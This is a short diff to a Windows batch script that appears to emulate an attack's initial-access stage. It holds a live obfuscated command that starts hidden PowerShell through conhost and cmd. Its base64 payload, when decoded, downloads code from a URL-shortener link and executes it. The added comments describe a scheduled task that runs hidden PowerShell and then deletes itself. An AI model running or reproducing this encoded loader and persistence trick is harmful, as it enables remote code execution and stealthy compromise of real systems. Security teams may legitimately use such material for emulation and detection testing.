@@ -16,6 +16,12 @@
 ::		Encoded Command:
 ::			conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"
 
+:: Content of bat file being executed
+::      schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater /F"
+::      timeout /t 240
+::       schtasks /DELETE /TN updater /F
+
+
 conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AdABpAG4AeQB1AHIAbAAuAGMAbwBtAC8AbQB2AHkAZQBqADIANAByACAAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkALgBDAG8AbgB0AGUAbgB0AA== /W 1"
 
 
@@ -32,3 +38,4 @@ conhost.exe cmd.exe /c "powershell.exe -w H -e SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0AV
 :: Initial Access : Second Stager Scheduled Task
 ::    Concept:
 ::       - 
+
